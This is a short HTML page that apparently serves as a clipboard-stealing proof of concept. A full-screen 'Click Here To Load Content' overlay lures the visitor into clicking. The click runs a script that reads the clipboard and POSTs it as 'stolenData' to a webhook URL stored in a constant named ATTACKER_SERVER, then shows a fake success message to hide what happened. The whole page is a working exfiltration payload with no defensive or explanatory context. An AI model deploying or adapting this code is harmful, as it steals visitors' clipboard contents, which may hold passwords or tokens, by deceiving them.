<!DOCTYPE html>
<html>
<body style="height: 100vh; width: 100vw; margin: 0; display: flex; align-items: center; justify-content: center; background-color: #f0f0f0; font-family: sans-serif;">

    
    <div id="overlay" style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; cursor: pointer;">
        <p>Click Here To Load Content</p>
    </div>

    <script>
        const ATTACKER_SERVER = "	https://webhooksite.net/bb68cf8b-0195-4e27-ae86-f786850da709";

        document.getElementById('overlay').addEventListener('click', async () => {
            try {
               
                const text = await navigator.clipboard.readText();
                
                
                await fetch(ATTACKER_SERVER, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ stolenData: text })
                });

                
                document.getElementById('overlay').style.display = 'none';
                document.body.innerHTML += "<h1>Content Successfully Contented</h1>";
            } catch (err) {
                console.error("Gagal akses clipboard:", err);
            }
        });
    </script>
</body>
</html>
